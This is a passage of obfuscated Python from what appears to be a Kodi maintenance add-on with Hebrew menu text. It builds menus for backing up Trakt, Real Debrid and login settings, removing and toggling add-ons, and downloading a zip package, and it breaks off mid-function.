	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0OO0OOO000000000 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת פליליסט לאודר:  '%O0000O0OOOO0OOOO0 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת הגדרות באפר: '%O0O000OO0O000OO00 .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3157
	addFile ('%s שמירת רשימות ריפו:  '%OOO0O00OO000O0OOO .replace ('true',OOOO0O00OO0OO0O0O ).replace ('false',O0000OOOO0O00O00O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3159
	setView ('files','viewType')#line:3161
def traktMenu ():#line:3163
	OO0OO0OO000O0O0O0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3164
	OOOOO0OOO0OOO00OO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3165
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3166
	addFile ('Save Trakt Data: %s'%OO0OO0OO000O0O0O0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3167
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOOOO0OOO0OOO00OO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3168
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3169
	for OO0OO0OO000O0O0O0 in traktit .ORDER :#line:3171
		O0OO0O000000OOOOO =TRAKTID [OO0OO0OO000O0O0O0 ]['name']#line:3172
		O0OOO0O0O0O0O0000 =TRAKTID [OO0OO0OO000O0O0O0 ]['path']#line:3173
		OOOO0O0O0O0OO0OO0 =TRAKTID [OO0OO0OO000O0O0O0 ]['saved']#line:3174
		O0OOO000O0O0O0OO0 =TRAKTID [OO0OO0OO000O0O0O0 ]['file']#line:3175
		O0O0O000O0OO0OO0O =wiz .getS (OOOO0O0O0O0OO0OO0 )#line:3176
		O000OO00O0O0O0O0O =traktit .traktUser (OO0OO0OO000O0O0O0 )#line:3177
		OOOO00O0OOO0O000O =TRAKTID [OO0OO0OO000O0O0O0 ]['icon']if os .path .exists (O0OOO0O0O0O0O0000 )else ICONTRAKT #line:3178
		O0O0OOO0O0000OOO0 =TRAKTID [OO0OO0OO000O0O0O0 ]['fanart']if os .path .exists (O0OOO0O0O0O0O0000 )else FANART #line:3179
		O0O0O0OOO00OO00OO =createMenu ('saveaddon','Trakt',OO0OO0OO000O0O0O0 )#line:3180
		O00OO0000O00O0OO0 =createMenu ('save','Trakt',OO0OO0OO000O0O0O0 )#line:3181
		O0O0O0OOO00OO00OO .append ((THEME2 %'%s Settings'%O0OO0O000000OOOOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0OO0OO000O0O0O0 )))#line:3182
		addFile ('[+]-> %s'%O0OO0O000000OOOOO ,'',icon =OOOO00O0OOO0O000O ,fanart =O0O0OOO0O0000OOO0 ,themeit =THEME3 )#line:3184
		if not os .path .exists (O0OOO0O0O0O0O0000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO00O0OOO0O000O ,fanart =O0O0OOO0O0000OOO0 ,menu =O0O0O0OOO00OO00OO )#line:3185
		elif not O000OO00O0O0O0O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0OO0OO000O0O0O0 ,icon =OOOO00O0OOO0O000O ,fanart =O0O0OOO0O0000OOO0 ,menu =O0O0O0OOO00OO00OO )#line:3186
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000OO00O0O0O0O0O ,'authtrakt',OO0OO0OO000O0O0O0 ,icon =OOOO00O0OOO0O000O ,fanart =O0O0OOO0O0000OOO0 ,menu =O0O0O0OOO00OO00OO )#line:3187
		if O0O0O000O0OO0OO0O =="":#line:3188
			if os .path .exists (O0OOO000O0O0O0OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0OO0OO000O0O0O0 ,icon =OOOO00O0OOO0O000O ,fanart =O0O0OOO0O0000OOO0 ,menu =O00OO0000O00O0OO0 )#line:3189
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0OO0OO000O0O0O0 ,icon =OOOO00O0OOO0O000O ,fanart =O0O0OOO0O0000OOO0 ,menu =O00OO0000O00O0OO0 )#line:3190
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O000O0OO0OO0O ,'',icon =OOOO00O0OOO0O000O ,fanart =O0O0OOO0O0000OOO0 ,menu =O00OO0000O00O0OO0 )#line:3191
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3193
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3194
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3195
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3196
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3197
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3198
	setView ('files','viewType')#line:3199
def realMenu ():#line:3201
	O0OO0OO0O000O0OO0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3202
	OOO0O0O0OO0OOOOO0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3203
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3204
	addFile ('Save Real Debrid Data: %s'%O0OO0OO0O000O0OO0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3205
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOO0O0O0OO0OOOOO0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3206
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3207
	for O0O0O00O0O0O0OOOO in debridit .ORDER :#line:3209
		O0O000OO0O0O00O0O =DEBRIDID [O0O0O00O0O0O0OOOO ]['name']#line:3210
		OOOO0O000000OO0OO =DEBRIDID [O0O0O00O0O0O0OOOO ]['path']#line:3211
		O0O000OO0O00OO0OO =DEBRIDID [O0O0O00O0O0O0OOOO ]['saved']#line:3212
		OO00OOO00O00O0O00 =DEBRIDID [O0O0O00O0O0O0OOOO ]['file']#line:3213
		O0O000O00OO00O00O =wiz .getS (O0O000OO0O00OO0OO )#line:3214
		O00O00OOOO0O0000O =debridit .debridUser (O0O0O00O0O0O0OOOO )#line:3215
		O0O0000OO0OO0OO00 =DEBRIDID [O0O0O00O0O0O0OOOO ]['icon']if os .path .exists (OOOO0O000000OO0OO )else ICONREAL #line:3216
		OOOOO0OOO000O00O0 =DEBRIDID [O0O0O00O0O0O0OOOO ]['fanart']if os .path .exists (OOOO0O000000OO0OO )else FANART #line:3217
		O00OO00O0O00OO000 =createMenu ('saveaddon','Debrid',O0O0O00O0O0O0OOOO )#line:3218
		OO0OO0O00O000OOO0 =createMenu ('save','Debrid',O0O0O00O0O0O0OOOO )#line:3219
		O00OO00O0O00OO000 .append ((THEME2 %'%s Settings'%O0O000OO0O0O00O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0O0O00O0O0O0OOOO )))#line:3220
		addFile ('[+]-> %s'%O0O000OO0O0O00O0O ,'',icon =O0O0000OO0OO0OO00 ,fanart =OOOOO0OOO000O00O0 ,themeit =THEME3 )#line:3222
		if not os .path .exists (OOOO0O000000OO0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O0000OO0OO0OO00 ,fanart =OOOOO0OOO000O00O0 ,menu =O00OO00O0O00OO000 )#line:3223
		elif not O00O00OOOO0O0000O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0O0O00O0O0O0OOOO ,icon =O0O0000OO0OO0OO00 ,fanart =OOOOO0OOO000O00O0 ,menu =O00OO00O0O00OO000 )#line:3224
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O00OOOO0O0000O ,'authdebrid',O0O0O00O0O0O0OOOO ,icon =O0O0000OO0OO0OO00 ,fanart =OOOOO0OOO000O00O0 ,menu =O00OO00O0O00OO000 )#line:3225
		if O0O000O00OO00O00O =="":#line:3226
			if os .path .exists (OO00OOO00O00O0O00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0O0O00O0O0O0OOOO ,icon =O0O0000OO0OO0OO00 ,fanart =OOOOO0OOO000O00O0 ,menu =OO0OO0O00O000OOO0 )#line:3227
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0O0O00O0O0O0OOOO ,icon =O0O0000OO0OO0OO00 ,fanart =OOOOO0OOO000O00O0 ,menu =OO0OO0O00O000OOO0 )#line:3228
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O000O00OO00O00O ,'',icon =O0O0000OO0OO0OO00 ,fanart =OOOOO0OOO000O00O0 ,menu =OO0OO0O00O000OOO0 )#line:3229
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3231
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3232
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3233
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3234
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3235
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3236
	setView ('files','viewType')#line:3237
def loginMenu ():#line:3239
	OO000O00OO0O0OO00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3240
	O0OOOOOOO0O0OO000 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3241
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3242
	addFile ('Save Login Data: %s'%OO000O00OO0O0OO00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3243
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0OOOOOOO0O0OO000 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3244
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3245
	for OO000O00OO0O0OO00 in loginit .ORDER :#line:3247
		OO0OOOOOO0O00OO0O =LOGINID [OO000O00OO0O0OO00 ]['name']#line:3248
		O0OOOO00O00O0000O =LOGINID [OO000O00OO0O0OO00 ]['path']#line:3249
		OOO0O00OOO0OO00OO =LOGINID [OO000O00OO0O0OO00 ]['saved']#line:3250
		OOO0000O0000O0000 =LOGINID [OO000O00OO0O0OO00 ]['file']#line:3251
		O0OOO0O00000O0O00 =wiz .getS (OOO0O00OOO0OO00OO )#line:3252
		O0O00O0O000OOOOOO =loginit .loginUser (OO000O00OO0O0OO00 )#line:3253
		OO000O000OOOO00O0 =LOGINID [OO000O00OO0O0OO00 ]['icon']if os .path .exists (O0OOOO00O00O0000O )else ICONLOGIN #line:3254
		OO0OO0O0O0000O000 =LOGINID [OO000O00OO0O0OO00 ]['fanart']if os .path .exists (O0OOOO00O00O0000O )else FANART #line:3255
		O00000OOOO0OOO00O =createMenu ('saveaddon','Login',OO000O00OO0O0OO00 )#line:3256
		O0O000O000O0000OO =createMenu ('save','Login',OO000O00OO0O0OO00 )#line:3257
		O00000OOOO0OOO00O .append ((THEME2 %'%s Settings'%OO0OOOOOO0O00OO0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO000O00OO0O0OO00 )))#line:3258
		addFile ('[+]-> %s'%OO0OOOOOO0O00OO0O ,'',icon =OO000O000OOOO00O0 ,fanart =OO0OO0O0O0000O000 ,themeit =THEME3 )#line:3260
		if not os .path .exists (O0OOOO00O00O0000O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO000O000OOOO00O0 ,fanart =OO0OO0O0O0000O000 ,menu =O00000OOOO0OOO00O )#line:3261
		elif not O0O00O0O000OOOOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO000O00OO0O0OO00 ,icon =OO000O000OOOO00O0 ,fanart =OO0OO0O0O0000O000 ,menu =O00000OOOO0OOO00O )#line:3262
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00O0O000OOOOOO ,'authlogin',OO000O00OO0O0OO00 ,icon =OO000O000OOOO00O0 ,fanart =OO0OO0O0O0000O000 ,menu =O00000OOOO0OOO00O )#line:3263
		if O0OOO0O00000O0O00 =="":#line:3264
			if os .path .exists (OOO0000O0000O0000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO000O00OO0O0OO00 ,icon =OO000O000OOOO00O0 ,fanart =OO0OO0O0O0000O000 ,menu =O0O000O000O0000OO )#line:3265
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO000O00OO0O0OO00 ,icon =OO000O000OOOO00O0 ,fanart =OO0OO0O0O0000O000 ,menu =O0O000O000O0000OO )#line:3266
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOO0O00000O0O00 ,'',icon =OO000O000OOOO00O0 ,fanart =OO0OO0O0O0000O000 ,menu =O0O000O000O0000OO )#line:3267
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3269
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3270
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3271
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3272
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3273
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3274
	setView ('files','viewType')#line:3275
def fixUpdate ():#line:3277
	if KODIV <17 :#line:3278
		OO0O0000O00O0O0OO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3279
		try :#line:3280
			os .remove (OO0O0000O00O0O0OO )#line:3281
		except Exception as OO0O00000O00OO000 :#line:3282
			wiz .log ("Unable to remove %s, Purging DB"%OO0O0000O00O0O0OO )#line:3283
			wiz .purgeDb (OO0O0000O00O0O0OO )#line:3284
	else :#line:3285
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3286
def removeAddonMenu ():#line:3288
	OO00OOO0000000000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3289
	OO00000OOO0O0O00O =[];OOOOO000000OO0O0O =[]#line:3290
	for O0O0OOO00O00OOO00 in sorted (OO00OOO0000000000 ,key =lambda O0O0O0OOO0OO00O00 :O0O0O0OOO0OO00O00 ):#line:3291
		OOOO00O0OOO0O00OO =os .path .split (O0O0OOO00O00OOO00 [:-1 ])[1 ]#line:3292
		if OOOO00O0OOO0O00OO in EXCLUDES :continue #line:3293
		elif OOOO00O0OOO0O00OO in DEFAULTPLUGINS :continue #line:3294
		elif OOOO00O0OOO0O00OO =='packages':continue #line:3295
		O0000O00O0000000O =os .path .join (O0O0OOO00O00OOO00 ,'addon.xml')#line:3296
		if os .path .exists (O0000O00O0000000O ):#line:3297
			OO0O00O00O0OOO000 =open (O0000O00O0000000O )#line:3298
			O0O0O00O0O00OOOOO =OO0O00O00O0OOO000 .read ()#line:3299
			O0O0OOO00O0000O0O =wiz .parseDOM (O0O0O00O0O00OOOOO ,'addon',ret ='id')#line:3300
			O0OOO0O000OOOOO0O =OOOO00O0OOO0O00OO if len (O0O0OOO00O0000O0O )==0 else O0O0OOO00O0000O0O [0 ]#line:3302
			try :#line:3303
				OO000O0000OOOOO0O =xbmcaddon .Addon (id =O0OOO0O000OOOOO0O )#line:3304
				OO00000OOO0O0O00O .append (OO000O0000OOOOO0O .getAddonInfo ('name'))#line:3305
				OOOOO000000OO0O0O .append (O0OOO0O000OOOOO0O )#line:3306
			except :#line:3307
				pass #line:3308
	if len (OO00000OOO0O0O00O )==0 :#line:3309
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3310
		return #line:3311
	if KODIV >16 :#line:3312
		O0O0O0O0OO00000O0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00000OOO0O0O00O )#line:3313
	else :#line:3314
		O0O0O0O0OO00000O0 =[];O0OO000O00O0O0OOO =0 #line:3315
		OOO0O00OOOOO0OOO0 =["-- Click here to Continue --"]+OO00000OOO0O0O00O #line:3316
		while not O0OO000O00O0O0OOO ==-1 :#line:3317
			O0OO000O00O0O0OOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0O00OOOOO0OOO0 )#line:3318
			if O0OO000O00O0O0OOO ==-1 :break #line:3319
			elif O0OO000O00O0O0OOO ==0 :break #line:3320
			else :#line:3321
				OOO0OOOOOO0OO0O00 =(O0OO000O00O0O0OOO -1 )#line:3322
				if OOO0OOOOOO0OO0O00 in O0O0O0O0OO00000O0 :#line:3323
					O0O0O0O0OO00000O0 .remove (OOO0OOOOOO0OO0O00 )#line:3324
					OOO0O00OOOOO0OOO0 [O0OO000O00O0O0OOO ]=OO00000OOO0O0O00O [OOO0OOOOOO0OO0O00 ]#line:3325
				else :#line:3326
					O0O0O0O0OO00000O0 .append (OOO0OOOOOO0OO0O00 )#line:3327
					OOO0O00OOOOO0OOO0 [O0OO000O00O0O0OOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO00000OOO0O0O00O [OOO0OOOOOO0OO0O00 ])#line:3328
	if O0O0O0O0OO00000O0 ==None :return #line:3329
	if len (O0O0O0O0OO00000O0 )>0 :#line:3330
		wiz .addonUpdates ('set')#line:3331
		for O0O000O0OO0O00000 in O0O0O0O0OO00000O0 :#line:3332
			removeAddon (OOOOO000000OO0O0O [O0O000O0OO0O00000 ],OO00000OOO0O0O00O [O0O000O0OO0O00000 ],True )#line:3333
		xbmc .sleep (1000 )#line:3335
		if INSTALLMETHOD ==1 :OOO0O00O0O0O0000O =1 #line:3337
		elif INSTALLMETHOD ==2 :OOO0O00O0O0O0000O =0 #line:3338
		else :OOO0O00O0O0O0000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3339
		if OOO0O00O0O0O0000O ==1 :wiz .reloadFix ('remove addon')#line:3340
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3341
def removeAddonDataMenu ():#line:3343
	if os .path .exists (ADDOND ):#line:3344
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3345
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3346
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3347
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3348
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3349
		OO00000O0OO0OOO0O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3350
		for O000OO00O0O0O0000 in sorted (OO00000O0OO0OOO0O ,key =lambda OOOO00O0000OOOOO0 :OOOO00O0000OOOOO0 ):#line:3351
			O0O00O000O0O0O0O0 =O000OO00O0O0O0000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3352
			O00OOO00OOOO00O0O =os .path .join (O000OO00O0O0O0000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3353
			O0O0O0000O0O000O0 =os .path .join (O000OO00O0O0O0000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3354
			OOO000OO0OOO00OO0 =O0O00O000O0O0O0O0 #line:3355
			OOOO00000O0O00OOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3356
			for O000O0O00O00OO0OO in OOOO00000O0O00OOO :#line:3357
				OOO000OO0OOO00OO0 =OOO000OO0OOO00OO0 .replace (O000O0O00O00OO0OO ,OOOO00000O0O00OOO [O000O0O00O00OO0OO ])#line:3358
			if O0O00O000O0O0O0O0 in EXCLUDES :OOO000OO0OOO00OO0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OOO000OO0OOO00OO0 #line:3359
			else :OOO000OO0OOO00OO0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OOO000OO0OOO00OO0 #line:3360
			addFile (' %s'%OOO000OO0OOO00OO0 ,'removedata',O0O00O000O0O0O0O0 ,icon =O00OOO00OOOO00O0O ,fanart =O0O0O0000O0O000O0 ,themeit =THEME2 )#line:3361
	else :#line:3362
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3363
	setView ('files','viewType')#line:3364
def enableAddons ():#line:3366
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3367
	OO000O0O000OOOO00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3368
	OO0OO0OOOOOOO0000 =0 #line:3369
	for OO0OOOOOO0O00O00O in sorted (OO000O0O000OOOO00 ,key =lambda OOOOOOOOOOO00000O :OOOOOOOOOOO00000O ):#line:3370
		OO00OOO000OO0O00O =os .path .split (OO0OOOOOO0O00O00O [:-1 ])[1 ]#line:3371
		if OO00OOO000OO0O00O in EXCLUDES :continue #line:3372
		if OO00OOO000OO0O00O in DEFAULTPLUGINS :continue #line:3373
		OO00OO0O00O00OO0O =os .path .join (OO0OOOOOO0O00O00O ,'addon.xml')#line:3374
		if os .path .exists (OO00OO0O00O00OO0O ):#line:3375
			OO0OO0OOOOOOO0000 +=1 #line:3376
			OO000O0O000OOOO00 =OO0OOOOOO0O00O00O .replace (ADDONS ,'')[1 :-1 ]#line:3377
			O00OOO0OO0O0O000O =open (OO00OO0O00O00OO0O )#line:3378
			O00O0O0O00O000OO0 =O00OOO0OO0O0O000O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3379
			OOOOOOO00OO00O0O0 =wiz .parseDOM (O00O0O0O00O000OO0 ,'addon',ret ='id')#line:3380
			O0OO0O0O0O00O00O0 =wiz .parseDOM (O00O0O0O00O000OO0 ,'addon',ret ='name')#line:3381
			try :#line:3382
				OOO0O0OO00O0O000O =OOOOOOO00OO00O0O0 [0 ]#line:3383
				OOOOOO0O00O0OO0O0 =O0OO0O0O0O00O00O0 [0 ]#line:3384
			except :#line:3385
				continue #line:3386
			try :#line:3387
				OOO00O0000O0O00O0 =xbmcaddon .Addon (id =OOO0O0OO00O0O000O )#line:3388
				OOO000OO0OO0000OO ="[COLOR green][Enabled][/COLOR]"#line:3389
				OO0O0O0O000OOO00O ="false"#line:3390
			except :#line:3391
				OOO000OO0OO0000OO ="[COLOR red][Disabled][/COLOR]"#line:3392
				OO0O0O0O000OOO00O ="true"#line:3393
				pass #line:3394
			O000O0O00OOO0OOO0 =os .path .join (OO0OOOOOO0O00O00O ,'icon.png')if os .path .exists (os .path .join (OO0OOOOOO0O00O00O ,'icon.png'))else ICON #line:3395
			O0000000O0O00OO0O =os .path .join (OO0OOOOOO0O00O00O ,'fanart.jpg')if os .path .exists (os .path .join (OO0OOOOOO0O00O00O ,'fanart.jpg'))else FANART #line:3396
			addFile ("%s %s"%(OOO000OO0OO0000OO ,OOOOOO0O00O0OO0O0 ),'toggleaddon',OO000O0O000OOOO00 ,OO0O0O0O000OOO00O ,icon =O000O0O00OOO0OOO0 ,fanart =O0000000O0O00OO0O )#line:3397
			O00OOO0OO0O0O000O .close ()#line:3398
	if OO0OO0OOOOOOO0000 ==0 :#line:3399
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3400
	setView ('files','viewType')#line:3401
def changeFeq ():#line:3403
	OO00O0OO0000O000O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3404
	OO000OOOOO0O0OOOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO00O0OO0000O000O )#line:3405
	if not OO000OOOOO0O0OOOO ==-1 :#line:3406
		wiz .setS ('autocleanfeq',str (OO000OOOOO0O0OOOO ))#line:3407
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO00O0OO0000O000O [OO000OOOOO0O0OOOO ]))#line:3408
def developer ():#line:3410
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3411
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3412
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3413
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3414
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3415
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3416
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3417
	setView ('files','viewType')#line:3419
def download (OO000O0O0000000O0 ,OOOOO0000000O0OOO ):#line:3424
  OOO00O00O00O00000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3425
  OO0OOO00OO00OOOOO =xbmcgui .DialogProgress ()#line:3426
  OO0OOO00OO00OOOOO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3427
  O000OOO00OO00000O =os .path .join (OOO00O00O00O00000 ,'isr.zip')#line:3428
  O00O00OOOOOO0O000 =urllib2 .Request (OO000O0O0000000O0 )#line:3429
  O0O0OOOO0OOOOOOOO =urllib2 .urlopen (O00O00OOOOOO0O000 )#line:3430
  OO0O0O00O000OOO00 =xbmcgui .DialogProgress ()#line:3432
  OO0O0O00O000OOO00 .create ("Downloading","Downloading "+name )#line:3433
  OO0O0O00O000OOO00 .update (0 )#line:3434
  OO0OO000O0000O0O0 =OOOOO0000000O0OOO #line:3435
  O0OO000O000OO0O0O =open (O000OOO00OO00000O ,'wb')#line:3436
  try :#line:3438
    O0OO00OO00O0OO00O =O0O0OOOO0OOOOOOOO .info ().getheader ('Content-Length').strip ()#line:3439
    OOO00O00000OO0O00 =True #line:3440
  except AttributeError :#line:3441
        OOO00O00000OO0O00 =False #line:3442
  if OOO00O00000OO0O00 :#line:3444
        O0OO00OO00O0OO00O =int (O0OO00OO00O0OO00O )#line:3445
  O00O00O00O00O0O0O =0 #line:3447
  O0O0O00O0000O000O =time .time ()#line:3448
  while True :#line:3449
        O00000O0O000O0OO0 =O0O0OOOO0OOOOOOOO .read (8192 )#line:3450
        if not O00000O0O000O0OO0 :#line:3451
            sys .stdout .write ('\n')#line:3452
            break #line:3453
        O00O00O00O00O0O0O +=len (O00000O0O000O0OO0 )#line:3455
        O0OO000O000OO0O0O .write (O00000O0O000O0OO0 )#line:3456
        if not OOO00O00000OO0O00 :#line:3458
            O0OO00OO00O0OO00O =O00O00O00O00O0O0O #line:3459
        if OO0O0O00O000OOO00 .iscanceled ():#line:3460
           OO0O0O00O000OOO00 .close ()#line:3461
           try :#line:3462
            os .remove (O000OOO00OO00000O )#line:3463
           except :#line:3464
            pass #line:3465
           break #line:3466
        O0OOO000OO000OOO0 =float (O00O00O00O00O0O0O )/O0OO00OO00O0OO00O #line:3467
        O0OOO000OO000OOO0 =round (O0OOO000OO000OOO0 *100 ,2 )#line:3468
        OOOOOOO0O0O0OOOO0 =O00O00O00O00O0O0O /(1024 *1024 )#line:3469
        OOO00OOO0O000OOO0 =O0OO00OO00O0OO00O /(1024 *1024 )#line:3470
